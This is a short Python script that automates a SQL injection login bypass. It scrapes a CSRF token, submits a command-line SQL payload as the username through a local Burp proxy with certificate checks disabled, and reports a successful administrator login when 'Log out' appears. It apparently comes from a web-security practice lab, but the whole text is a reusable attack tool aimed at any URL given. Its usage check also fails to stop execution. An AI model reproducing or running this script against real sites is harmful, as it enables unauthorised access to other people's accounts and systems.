import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# We will use our burp proxy to test this.
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# This function is getting our csrf tokken from the html file that we put into r and soup will find the input(type) and value(that is csrf).
def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

# According to our response this fuction will put the csrf tokken in place , username (that is our payload) and then password.
def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf,
            "username": payload,
            "password": "randomtext"}
# There we are checking the file if there is a keyword (Log out) it mean we are (logged in) the injection is successfull.
    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False
# This is like our main fuction in which we are specifing the input that we are going to give in the terminal.
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
    # this is (requests) fuction this will get the session.
    s = requests.Session()

    # This is a check that our sql injection is good.
    if exploit_sqli(s, url, sqli_payload):
        print('[+] SQL injection successful! We have logged in as the administrator user.')
    else:
        print('[-] SQL injection unsuccessful.')
